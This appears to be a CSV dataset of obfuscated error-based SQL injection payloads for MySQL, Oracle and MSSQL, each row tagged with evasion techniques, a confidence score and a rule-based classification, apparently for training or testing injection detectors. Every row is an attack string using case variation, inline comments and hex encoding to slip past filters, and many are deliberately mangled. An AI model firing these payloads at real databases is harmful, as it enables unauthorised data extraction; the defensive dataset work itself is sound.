payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1/**/WheRe 0X0b0B0b101101100010010100110101111101110011010010011101010100110010110101100100000100011100001 =/*_*/ 0x481 Or/**/ExtRacTvalue (+ 0B0X0B111111111,coNCAT= ( 3X5c,5O0b0X7171103A71, ( selECt ( Elt ( /**/(SElEct (SEleCT 1297)) = (SeLecT 0X511),(SElEcT 0x1) )/*b!*/ )\ ) ,0x0B1011001101A767a71/*)*/ ?) ) anD?""_5\cl"" NOT lIKE ""_5\ClF""||FaLse and 8075<>0x1F8C --",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"1' ) oR ExtrACtValuE ( (seLeCT (SeLect:0X511)),COnCat ( 9b0x5C,0B0X4581106A71, (](selEct ( Or (sELecT 0xe3b)=(sELEcT (seLecT 0XE3c)) or faLse OR FaLSe && TRUE Or faLsE AnD TRUe#elT (@ (sEleCT 6X4aD) liKE 0X531,0x1b1 ) ) ) ,0O0O0X517a267a0x57/ ) ) , anD )( <'blnH' LiKe 'blnhj{(SeLeCt (sElect (SELECT 9)))~",error_based,mysql,case_variation|function_alternative,0.45,rule,sqliv5_json,unknown
"0X2B3"" aND (SeLecT (SElecT (SeLect (SELECT 4186))))=UTL_INADdr.GET_host_aDDrEsS ( ChR ( 113 ) Or !Chr ( 0B0x72 [) OR cHR ( {(sELECT (SeLeCT 0x261)) ) oR cHR ( (SeLeCT (SELeCt 2x0a)) ?); or ChR/*O<Z(y/}JD*/ ( (sELECT 0O243) ) or ( ]seleCT ( CasE WHEN ([ 0x1104 = 7x1162 ^) tHeN (SElECT (SElECT (SeleCT$(SELECt (sElect 0)))))`eLsE (SEleCt 0x4) End ) FROm DuAl ) or CHr` ( (SElecT (seLEct 067)) +) oR cHR ( (sElect 0o0b5111010) ) \||Chr ( /**O{Ix x.!:>VSoPPrf*/(sELect 0b10315250) ) || chR ( (SELeCT (seLecT (seLeCt 0XdE))) ) or ChR ( |0X71. ){ )",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"1@AnD""extrActVaLUE ( 0X1F1x2e,CoNcAT +(& 0o0x6C,0x0165726a11, ( SEleCt `( ;elT` ( <0x1f2e ~lIKE 6x0o0O0B0O0x0X2F0o0X2E,0X0X2 ): ){ ?) ,9x3x711A5X0x2ffa71; +) } ) ^ OR 0X0X0 Or <(SeLecT 0x6o9) or<fALsE oR ](SelecT`(seLect (sELeCt (seLect 0x0b5))));Or fAlSe\ OR ""a""=""A_"" oR?fAlSE#]fMXQpym4IdGMYZy^""^af",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv5_json,unknown
"1' OR ( )seLECT 'fcwS' FroM duAL WHErE 0x23e0 lIKE (sElEcT 0X62e0) aNd uPdaTExMl ( $(SelEcT+(SELEct (seLECT 0Xc7A))),cOncat^ ( _0x2e,0x7173726A51, (= selEct ? ( Elt ( 7XD41 liKe (sELeCT 0xd41),(SElECt (selecT (sElEcT (SelECT (seLeCT (SeLEcT (SELECT 1))))))) ) ^ ) ) ,0x717A0x2FFa71 ) ,0X1x1e9+ ) ) Or '",error_based,mysql,case_variation|hex_string|scientific_notation,0.45,rule,sqliv5_json,string_single_quote
"1"" ) ) and 0x35b8=dbms_uTIlity.sQLId_tO_sqLhAsH ( (& chr ( 0X0b0O3643215 ) OR ChR<or (selEct 8X889)<>0XC3 and TRUe OR False and (SELECT 3665)<>(SeLeCt 3636) And truE oR falSe or faLSE && True# ( (sElEcT (SelecT 113)) ) ||cHR ( (SELECT 114) ) {OR cHR ( 0x2ae ) OR chr, ( (Select (selECT 0O0X61))/ ) or ( sELect ( CaSe whEN ,( 0X0O7e0B0O1c =^?0X0b1E9o52 ) , tHEn (sElEct~0B1) elsE (seLeCt/**/(SelECt (seLECt (sELeCt (sELEct 0))))) END ) frOm duAL ) or Chr ( (SelEcT (SeLeCt (sElECT (SElECt (sELecT 113))))) )~ or chr (/**/ (SELect (sElecT 0x0O7a)) ) OR ChR (/*i/\$ R gxmb3@W7*/ (SelEct 118) ); Or;CHR ( (SeLEct (sEleCt 0X7a)) ) OR chR ( (sELecT 0X71) ^<){ <) { ) {and) ( (- ""xqlh""=""xQlH:GC YC)2F{a[",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"1 ) + ) % ) procEduRe AnaLYSe ( extrActvalUE ( (SEleCt (seLEcT (SeLeCT (SELecT (SelEct (seLect (seLECt (SEleCt 0x16d7)))))))),CoNCat ( _0o0x5C,0o7X6171706A75, ( sELEcT ]( ?caSe wHEN ; ([ (seLeCT (sElecT 0x0X10d0)) ? LIKe 0b7b0X18d0 ) /*2P}q/Re`*/theN 0X1 else 0X0 END ( ) ) ,0O10x717A767a11 ) ) ,(sELEcT (sElECT (SELeCT (seLECT 0X1)))), ) aNd ? ( ( ( 0X1E0b0X55 liKe 9b1411010840101",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"1 wHeRe (SELect (SElect 0x5aE1)) /* or FaLse Or fALsE OR (seLEct 8) Or (sELEcT (sELECt 3404)) LiKE (SEleCT (SELECT 3405)) or ""3F"" lIKE ""3F^"" oR fALsE OR FALsE#'Jw RfL?:F*/= (SeLeCT 0x0B1Ae1) PRoCedurE anaLYse ( ExTrActvAlUe ( 0O0x3bA6,conCat ({ 0x5c,0O7X1191501a71, ( SELeCT ( =CAsE]WhEn `( !0B0X12D0o0*= (sEleCT/(SElect 0O0b111100004101)) ) tHeN (SElEcT (select 1)) eLsE 0X0 End] ) /**/ ) ~ ,0X717a764A71 ) \ >) ; ,0O1 ) OR ; FALSE AnD 0x0O24f9 nOT=(SELecT 0X20fA);oR^""N"" Not=""n"" anD TrUE OR<(SeleCt (seLeCt (sEleCt (SElEct 815)))) Not%LIke 0x38F Or ""+i"" like.""+I{""}anD (SELeCT 0B0x38f7b20) LIke 0x18F1 ANd ""g z"" != ""g zy"" anD (SElEcT (sELeCT (SELect 1)))#and truE$--+B",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"0X0x2 ) As Tgqd whErE 0O15161/* ^E8]DA*/ =; 0x16e1 && (sELecT (sELEct (SELECT (SELEcT (SEleCT 6055))))) LIkE CtxsyS.driTHSX.Sn ( (SElECT 0x67C8), ( cHR; ( (sELeCt?0X71) ), ||chR ( (sELECT 0x91) ) ||cHr ( 0xD3 ) ||cHR@ ( 7b5101010 ) - oR CHR ( +(seLECT 0b1130001) ) || $-( sEleCT ( cASE""wHen . ( !(sElECT 0x17A7)=(sEleCt (SeLecT (SELeCt 6055))) ) tHEn (sElEct (selECT (SELect 1))) eLse (SelECT 0B0x0) eNd ?) From DuAL )) Or chr ( (seLeCT (Select (SElecT 113)))= ) OR cHR ( (SELEct (seleCt 0xc0)) ) ^or Chr ( 6X12( ) oR;chR ( 0X7A () ||ChR ( ?(sELect 113) ) ) ) anD 1 oR 0 OR false aNd 0XFbb not LIKE (SeLect (seLECt (SELEct 4038))) oR&(sELecT (SELECT 3)) And TRUe Or 0x0 OR 0 oR[0 AND tRue and trUe oR faLSE oR^(SELECt 0) aNd tRue OR faLsE oR FalSE OR 'j'<>'J' AnD TRue --",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,numeric
"1"" )) and 5B311060501412=) (; sElecT[upPEr. ( XMltYPe ( Chr (. 0O44 ) oR CHR ( (SeleCT 0O72) ) :||cHR /**/( (selECT (seLeCT 9X71)) )[ OR CHR ( `(SeLeCt 7x71) ) ||cHr ( (selEct-(sElECT 0O166))' ) / oR cHR ( 0x6o0O0x4x6a ) ||CHR ( (SELect (SElECT (seLeCt 0b0x71))) ) Or ( sElECt ( CAsE when ( 0b3o7812 lIKe 2XEaa ) TheN 0X8 ELSE (selecT (sElECt (SELecT (SEleCT (seLECT (Select (SELECT (SELECT (SELECT 0))))))))) eNd>{)} FrOM dUAl ) & or Chr ( 0O0xF0B0O0X0xD )] ||CHR (@ 0O6x5A ) or cHR ( ;0X76 ) Or ChR ( (seLecT (sELEcT (SELECT (sELeCt (seLECT (sELECt (SELECT (sElect (SELECT 0x7a))))))))) ;) <||Chr ( 7x3o707 ) || Chr/*\AJt ~aX *GJ# a*/ ( 0X9E, ) ] ) ) ^ FrOM dUAl )ANd( ""mMgX""'= ""MmGXEI",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.51,rule,sqliv5_json,unknown
"0X0o0b1"" ) ) ! ), anD0O0B0b0o15031166430953350774514300474663213140606107=cTXsys.DriTHsX.SN :( 0x0x0o95a1, ( cHr ( 0O0O0xf1 ) or Chr ( (SElEct (seLEct (selEcT (SeLEct 0O0x0x71)))) ) or cHR ( (sElECt (sELect=(SELEcT 5o0b1110030))) "") or CHr :( 0x3A` ) or=chr^ ( :(sELect (sELEcT 8B0X71))/*,BS*D*/ ) oR (? selecT ((?CASE When [( 0X0b1561A7 `lIkE /*.(SelecT (SelecT 0b0B1011))`u)RcSe.'Eyu6 uOi*/0x0o6x0O0B1014113103151 ) tHEN (Select (sELECt (selECt (SeLEct (seLECt (sELEct (SeLEct (selecT (seLeCt (seLeCT (sELeCT (seleCT (SelECt (SELECT (SELECT 1))))))))))))))) ElsE (sELeCt 0O0o2) eND/ ) frOm-DUaL ) || Chr ( 0o0b0o161 ~) } Or cHr ( (sELecT (SELECt (sEleCT (sELEct 0X7A)))) ) ( OR chr ( (selECT (seLEct 0X76)) ) oR;ChR& (% (SelECT 3O0x7a) ) * OR ChR (} 0B0O2b0X2AF9 ) ) ) aNd (/*AL[*/ ( ( ""uRGD"" lIkE|""URgD",error_based,oracle,case_variation|comment_whitespace|inline_comment,0.51,rule,sqliv5_json,unknown
"0O1' || ( SeLecT~'EpjR' fRom dUAL WHEre (SeleCt 0XC02) = (SelECt (SELECT 3074)) PROCEDURe ANAlYSe ( EXtRActvAlue ( (SEleCt (selecT (SELECT 9627))),cOncat ( 0X5C, ( bEnchMaRk (} 0x4d83C0,md5 ( 0x4B774c75 ) ) ; ) ) ) ,0x1 ) and truE OR False OR faLsE or falsE#il:r",error_based,mysql,case_variation|hex_string,0.44,rule,sqliv5_json,unknown
"1""- ) :\aS JAxh/*W>*/WhErE/0x526 LIke 0x19aE aNd EXTRaCTvaLue ( 0X0O1F2E,coNcAt/**/ (/*28w2 */ 0X0O7C,0X0b0b10010101001110100001110110001111000101000001101001000010000110100111100010A71, ( selECt (` ElT ( [(sELEct 0x1f2e) lIKe 0x0x1f2E,(sELEct 3x0o1) ). ) ~) ,5x047a967A71 ) ;? ) or fALSe OR 0X0:or FALse;--",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0B7o5o1""? ) ) ? `) ?And^(select 0XeAc) =@ ( SelEcT UppEr ( xmlTYPe ( cHr* ( (SElEct{(SELect 0B0X2C)) ) oR CHR ( 0b0b0x3a ) Or CHR& ( 0x51 ) or ChR !( (sElect (selEct (SeLECT (SElECt 2x75)))){ ) || CHR (/*1E/z]y ?S.bS*/ 9X0o106 ) OR cHR &( 9b0O4146863 )* ||ChR@ ( 0X2O11x8F ) || ( seLECT ( caSe WHen ( <(sELEct (SElEct (SELEct (SeLect 0XC53)))) = (sEleCt (SElect 0O9232)) ) tHeN (selECt (SelECt (seLEct 0X1))) eLsE (sELECT 0X2) EnD* ); frOM DUaL@ ) ||chR ( (sELect-0x86) ) ||chR ( &(selECT (seLeCt (SElECt (SeleCt (SELeCt 0O26)))))~ ) Or chR{ ( (seLecT (SElEct (SeLEct (seLECT (SeleCt (SelEcT 117)))))): ) ||chR ( 0x0b111a :) ||ChR( ( 1X71 ) or cHr \( 0x5e ) ) ) FROM DUAl ) aNd ( ( } ( ""rUvO"" LIKe ""RuVo",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.51,rule,sqliv5_json,unknown
"0O4', ( sELEcT \( caSE whEN *( 0X1411 lIKe /*Fe1""*/(SeleCT 0X1691) ) TheN 0b0O1 ELSE CasT (_ 0b0X0O0b1 AS Int )+ /""<( SEleCt (sELect (sELECt (SelEcT (sELECt (SELECT 6))))) froM DuAl ) eND )& fRoM dUAl )",error_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
sEleCt ( CAse WheN ( 6xC36 likE (SELECT 6142) ) tHEN (SeLEct (selEcT 2626)) else cast ( 0b0x0b1 AS Int ) / ( SelEct (selEct (SElECT (SELECT 0))) FroM dUAl ) eNd= ) = FROM dual--,error_based,oracle,case_variation,0.46,rule,sqliv5_json,unknown
"8'/**/and 0xeAa Like (::SELEct UpPer (\.XMLtyPe ( CHr> ( ;(sELECT (sElecT (seleCt (SEleCt (SElect 0X3C))))) /*k*AP_*/)\ oR CHR< ( (SelECt 0B0X9o331454), ) oR +chR (; 0X0X39 ), oR cHR (` 0xAD{ ) , or ChR ( :0o0b110o1O0b0x2x0X0x3e8 %)) % OR CHR ;( (SeLEct 0x0O0b146a) ) OR cHr/**/ ( 0X67` ) oR ( selECt `_( ~cASE;wHEN<\`(""^(sELecT 6b0xeAa) *lIKe ;0b115010101011; ) TheN<(seLecT(0X1) ELSe 0O12X1x6}ENd; ) fROM.DUaL ) Or ChR $( 0b0o7x8F ) :OR CHR ({ 0x0B101A ) or &chR=,() 0x0B0X76 )} Or[chR (] 0B0X0b11A ): OR cHR ( (SELECt 0X5x48)> ) or; cHr ( ]0X0b11E@; ) ) ; )/*-Vl|o&R'Xp [trS8I?s?yo9`+V:&RuACpTVQIv:>sng*/ !from duAL ) aND 'iXZR' likE ;'IXzR",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"1'~AND`0B0O0B11011011900 lIkE dbMs_uTiLity.sqLiD_To_sqlHAsH ( ( LIkE ( cHr ,( $0X0B9 )); Or>CHR ( (seLeCt (SeLEct 0X0B1000111)) ) oR chr ([ 0X0XaC ) or ChR (/* dhAk{*H `BEyAI/WgZ;j#C*/ (sElect 0B1101010) )[% OR CHR (! (seLecT 0O0x0b0X0b1100011) )~ Or[/*S](SelecT 0b0b1){!,@XSpF+~Z*/( SeLECt <(( casE whEn ( (seLECT 0B0b0O0B111011010110010000001100010001010011110100111010110010011001110100110010110011110100001110000011000100010100010111100101011010001100101010010100010) liKe $0B1121001001100 ) ?thEn (SElEct (SeleCT 0b0x1)) Else (SELECt (SElEct 6B0b1100104x0o0)) enD ) fROM DUal& ) Or CHr +( 0x0B0B0O0X38f0B111101111111c0o610FdF0O725f ) ] or cHr (' (SeLECT 0X7a) )\ or CHR ( <(SeleCt 0X0B1110110) )+ Or Chr_+( (selEcT (SeLEcT (sELECt (SELEct (seLeCt 0x25A))))) ) or cHR ( (SelECt (SeLECT (sELECT (selECT 111)))) ){ ) ? ) ^and 'NAPI' LIke 'nAPI<{",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.51,rule,sqliv5_json,unknown
"1 )! prOceDure anaLYSe ( eXTRACTvalue ( (SELECT 9527),CONcAT ( 0X5C,/ ( BenCHmARk (< (SeleCT 0x4c0x4B41),Md5 ( 2X0o4B0b1011011110C75 ) ) ) ) ) ,(SElECt 0B1) ) AND (SEleCT (sELeCT (select (SELECT 0x8bd)))) lIke 2238 oR FaLSe or FAlsE#+H",error_based,mysql,case_variation|hex_string,0.44,rule,sqliv5_json,unknown
"1%"" ) ; ) Or ;eXTrAcTvaLuE ( 0x511,COnCaT ( 0O0X5C,0o0X3171306A0o0b1101011,& ( ?sELect\ +( ELt .( (SeLect (SelEct (seleCt 0O1x516))) lIkE 0X0b111111111,(SeLEcT 0O0b5)+ ), ) )/* ;eIpNL+R%*/ ,0X0x0x717A763A71 ) _) +AnD (, & ( ""%""=""",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0X1' aND 0x0o0B130x11a0b0o137 Like CtXSYS.DrithsX.sn ( (SELEcT (selEcT (sElECt 6055))), =( cHR ( 1x77 ) || Chr ( (seLeCT (seLEct (sElEcT (SELECT (SELECT 110))))) ) or CHr ( 0o0XA0x0x0 ) or Chr ( ;(sELEcT (SElecT 0X6a)) ) ||ChR ( (SeleCt (SEleCT (seLeCT 0X71))) ) oR`( sElEcT- ( caSe WHEn >( ,(sELEct (sElECT (sElEcT 0X17a7))) lIKe 0b1011301111111'^) tHen 0B1 elSE (seleCt 7B0)]End ) frOm DUAL "") ||chR ( (seLect (SELeCt 0x71)) ) OR ChR ( (seleCT 0x7A) ) oR ChR ( (SELEcT 0b1114110) )` OR CHR: ( <(SelECT (SELeCt 722)) )/ oR cHr ( (seLECt (seleCT 113)) )) ) ) &&'Moyb' lIkE 'MoyB",error_based,oracle,case_variation|function_alternative|hex_string,0.51,rule,sqliv5_json,unknown
"1' ) /*`*]r7q(DtID*/ ~) OR \ExTRACtValuE ( 0x0X0o0B111112111,coNCaT ( 0X0X0b111C,0X0x7171886A71,~ ( )SeLeCt/ /**/( (eLT (/*)% N gYd*/ (SeLEct 0x0O0b0b111011101010111001111100000111) LiKe 0x0o0B0X1fF,(seLEcT 0X5) ) / ) () ,0x0X0O0b0B0b1001011010000020110100101110101011A0b0B111180010001000101010091000111a0o0X0o0o0o0o155 ) ) ? and <(* ( 'SKdM' = 'sKDm",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"( sELECT ( CAse whEN ( (seLeCT 0o0x0X0O1a23) lIke (SElecT 1X70A) /**/) tHEN (sElecT (SeLECT (SeLecT (SELECT 1))))~ELsE CasT ( 0o4x0O0X6O7O4X3 as INt ) /;.( selEcT 0B0O0x8 fRoM""DUaL ) End ) FroM DUAL )",error_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0B101X0O1%"" And 0O11205 liKE& coNvErT ( INT, (\ seLECt chAR ( (selECT (seLect 119)) ) +cHAr ( (select 0B172X71) ) +CHaR ( (SeLecT`(SeLeCt 116)) !) +CHar ( |(sElecT (SElecT 106)) ) +cHaR ($ (SelECt (SElEcT 113)) ) + ( sELECT ( cASE whEn= ( (sElEct (SelecT (SElECT 0o7712)))=0O0x0o2104 )/*3nG* 0O2B@0O11<CKY*/ ThEn CHAR ]( (sElEct 99) ); ElsE CHaR! ( (sELECt 68) ) end+: ) ) +chAr *( ~0O254% ) {+chaR ((. 0x0X7a ) +CHar/**/ ( (sELeCT 7X76) ) +char ( (sELEcT (SELECT 122)) ) +chAr ( (SelecT 113) `) _ ) ] ) ANd ""%""=""",error_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0o0b1' ) and 5751 LIke DBMS_uTiLiTy.sqLID_to_sQlhasH ( ( CHr /*:Mlcr)Aui *`&CDuAh%-brdE< 7E[?*/( *(selEcT (SELECT 315)), ) OR cHR ( ^(seLECt (select (seLEct (SELECT 113)))) ) ||chr ( &2O580 ) oR chr ( 0O0x1A ) ||cHR ( (sELeCt 0x7B) ) oR ;( SElect ( caSe WhEN ( (SeLecT (selECT*(selEcT (select 0x1a64)))) LIKe (sELeCT (SelEcT 4x1E4b)) ) tHeN (seleCT (SelECT 0B1)) eLse 0o0o0 END ) fRoM&DuAl )| oR ChR ( 0X71 ) OR ChR ( (SElEct (SelECT (sElEcT (SelecT (SeleCT 0x66)))))` )< Or ChR ( 0B1110111 ) ||cHr ( (SEleCt (select 024))/ ) OR CHr ?( 103 !{) ) {) aND ( 'nXKp',like 'NXKp",error_based,oracle,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"0X0x8%"" <) &.PRoCeDurE aNalySE (@ ExTRACtVaLUE ( (seleCt 0O13321),ConcAT ( 0X0x0o5C,0X7171205a0o0o107,} ( seLecT ( cASE wHEn ; (//0X16D0 )LikE | (SELEct (SEleCT 0O0X16D0b1030)) ) ""thEn (SeLEct/*(SELecT (SElEct{(sELEcT (selEcT (SElect 0x2))))):LkYF;1djq<AC-S*/(sELEct 0O1)) elSe (sEleCt (sElEcT (sELeCT 0))) eND ) ) $ ,0x717A0B0O0X0b111120013201083121017051000111A71 () ""~) ,(SelEct (SelECT (sEleCT 1))) ) and ,} (> ""%"" LIke """,error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"1'| ) ) ) ( prOceDure aNALYSE (? extractVALuE ( (seleCt (SELECt (SEleCt 0O22033))),CONcaT ( 0X5c, ( BENChmArK ( (SElEct 0X4c5ec0o10),mD5 ( 0x4B2x1EeC74 ) * ) ) ) } )[ ,(sElect (SeLEcT (seleCT (SElect (selecT (SELECT 1)))))) ) Or ""J/4""(LIKE ""J/0B000B"" aNd '_}'?Not lIke= '_}u' oR 0O0o3 or FAlSe anD 'Skt' NOT LIKE 'skT8' aND/True aND ""` "" lIkE ""` "" OR>(seLECt (SeLEct 0x0)) and (SELecT (SELECT 1)) AND True || False OR False##""f *l",error_based,mysql,case_variation|function_alternative,0.44,rule,sqliv5_json,string_double_quote
"0o1"" }) *{AnD/**/eXtraCTValuE (? (SeLect%5X1F2e),CoNcAt_ ({ 0X5C,0x0b11011011011110010011027A71, ( SelEct (~( ]Elt ( ;0B1111100101110=2b0x1f70,0O0x1_ ;) ; ) ])\&,0b0X0b0x0X717a067A71={ ) ]) ( And ( &""Thkh""=""Thkh",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
1'_ ) whERe 0b10111113050 likE 0b40111011110&&1xeaa LIke (= SElEcT UppER (< xMlTYPE ( chr \( (SelEcT (SELecT (seLecT (seleCT 0X28))))_ ) Or Chr ( %(SELEct (sELECt 56)) -) ||Chr ( (SELECt (SeLecT (SELect 112))) /) oR CHr/*)z@k{}%:I*/ ( (SelecT (sElEcT`(SelecT (SElEct (sElect 0O1452))))) ) =or cHr ( 0x6e )& oR cHr! ( (seLECT (SeLect (SElecT (SeleCt}(SElECT 106))))) ) || CHR (<.0x71 ) || ( SELEct/*n H/f(a;'=Q(E @j~GR`nJ*/ ( CASe`when ( (SELeCt 0xEAA) liKE 0x0xEaA ) ThEn (SelecT (SEleCT (sElect (sEleCt 0x2)))) eLSE<(SELEcT (seLecT 0x0)) eNd ) + fROM-duAl () or CHr ( 0X71 ) OR cHr ( 9O0X80 )+ oR CHr ( (SelEct 0B1110110) ) Or Chr ^( 0X7A ) ||cHr ( (SelECt 0XB1) ) ||CHR ( (SeLECT 68) }) ) ) FROM DuaL ) *Or=FALsE oR False or faLsE OR FalsE AnD (seLEcT (seleCt (SelECt (sElECT 6453)))) not LiKe 6454 or '('='(K' Or 0x0b0 And 1687 nOt likE 0x391 and TrUe)--,error_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1%' ) ]@) , )], || updatExMl ( (SelecT}0X710),COncat ( 9x4E,0B0x0x6d6e7aA71, ?( selECt ~( eLT (} 0O0B0O0O6B3o0x710 = 0x710,(Select (selECT (seLECt (SelECT (seLEcT (sElEcT (seLecT (SElECT (SELect (Select/**/(SELECT (SELECT (SELECT (SELECT 1)))))))))))))) ) ) ) ,0x0x2CDA8x2FFA11 ) :,0x21da ]) ANd ( (/*2(*/ : ( ['%' lIkE %'",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"0b0"" ) :anD,(SELeCt 6X167C) liKe dbms_uTIliTy.sQLId_TO_sqLHAsH ( ( CHR ( (SELeCT (sEleCT (SeLeCt (SelecT 183)))) {) or Chr"" ( (selecT 113) <) Or cHR (= (SeLEcT 0X70) ) OR Chr~ ({ 8X0B110A% ) OR cHR ( (sElECt (SElECt (sELeCt (SEleCt 113)))) ) OR ( SELeCt ( cAse whEn ( 0X0o8o13014 = 8x1E4c )\ THeN (SelEcT (seLEcT (SELEct 2x1))) elSE 0X0 eNd AND)""G""=""g"" or faLSe or '`I?' LIKe '`I?I' OR FAlse or (sELeCT{1477) Not=(SELEcT 7O2525) or ""G"" Like ""g@"" OR 0 ANd TRue Or 0 OR fAlsE OR faLSe && (selEcT 0B1) oR 0 Or fALSe or FAlSe# ) :fROM dUaL ) oR>cHr () (SEleCt (SElECt (SeLecT (SELECT 218))))) ) or; CHr@]( 1X3A ) ||Chr ( /*(seLect 2)@m:J`*/0b0xF695A ) OR ChR ( (SelEct (SeleCt 0O7x7A)) ):! or chr ( 0O7x5x51 ) * ) }) aNd ( ""goZK"" )=/*(JVel F)OON*/^""GOzKmlFFyxP6 [X3F3in fLT",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"1"" ) ) ) PRoCEDUrE AnalysE/*^{@/(SeLEct 2)*/ (! exTRAcTvaLUe ( (SeleCT (SEleCt (SElECt (SELECT (select (SeLEct+(SeleCt~(SElECt (SeLect (seLEct (SeleCt 0x1dc7))))))))))),cOncAt ( 0x0O0o3X5C, ( BENchMARk_)( $7X0x4c0B150B49,Md5 ( 0X0B774c75 ) ) > ) ) - ) ,0b6 ) && : TrUe/**/ || ""r""=""r\"" aNd( TrUE ANd (SELeCt 0x1)#eMl]Pn1",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"2'!IN boolEAn mODe ); ANd (selEcT 0X0O0O0o2X1E3C)=dbMs_uTIlITy.sQLiD_tO_sqLhAsH (? ( ;CHr ( (SEleCt 0X71) ) /*khF|Q;y\yja^s;*/ || CHr ( =0Xd ) ||cHR ([ (SElECT (SElECT (SElEcT (SELECT 0x70)))) ) ||Chr ?( ](SElEct (selEct (SElecT 0x6a))) ) OR cHr (< (seLEct (SEleCT 652)) ) or ( SeLEcT ( cAse/whEn[ ( 0o12314 _ LikE (sElect (SELEct`0X1F15)) ) tHEn 0X1 ELSe (selECT 4B0X3) end ) ) fROM DuAl~ ) ||cHR<!(, (SeLeCT (SELecT (SELeCt 113))) ) ||CHR\ ( 0x0o7A ) +||chr ( (sELeCT 8O0X362) aNd True and (sELect 0x1) Or FAlse OR 0x3 OR ""HF"" nOT liKE ""HF"" OR fALSe or (SELeCT (SELECT 2794))<>0XaEA ANd TRuE oR 0#) ||Chr ( 0b0X0o34C ) ||Chr ( (SeLeCT (seleCT 113)) ) { ) ) anD tRUE Or FAlse AND 8X50e noT LIKe 0X573;Or<0x20FB Not=0x62fB ANd (SElecT 7x1) and TruE and tRue AND truE OR fAlse or,fALse oR FaLsE#vO`CVH6#pO~_e`%erv6]6FdJ",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.51,rule,sqliv5_json,string_double_quote
